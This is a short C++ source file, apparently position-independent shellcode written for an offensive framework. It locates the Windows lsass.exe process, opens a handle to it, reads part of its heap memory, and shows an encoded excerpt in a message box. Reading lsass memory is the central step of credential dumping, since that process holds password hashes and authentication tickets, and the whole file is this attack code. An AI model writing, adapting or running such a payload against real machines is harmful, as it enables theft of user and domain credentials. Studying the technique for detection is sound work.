#include <core/context.h>
#include <core/pebwalker.h>
#include <epic.h>
#include <libc/stdbool.h>
#include <libc/stdint.h>
#include <libc/stdlib.h>
#include <modules/utils/utils.h>

extern "C" void main_pic() {
    wchar_t proc[] = L"lsass.exe";
    uint64_t pid = utils::get_pid_by_name(proc);
    if (pid == -1) {
        utils::message("Get pid failed!", "main error");
        return;
    }

    HANDLE h = utils::open_process_by_pid(pid);
    if (h == NULL) {
        utils::message("Unable to open proc!", "main error");
        return;
    }

    size_t bufferSize = 4 * 1024; // KB
    size_t printSize = 1 * 1024; // KB
    char buffer[bufferSize];
    bool readOk = utils::read_process_heap(h, &buffer, bufferSize);
    if (!readOk) {
        utils::message("Read process heap failed!", "main error");
        return;
    }
    utils::message_encode(buffer, printSize, "heap");
}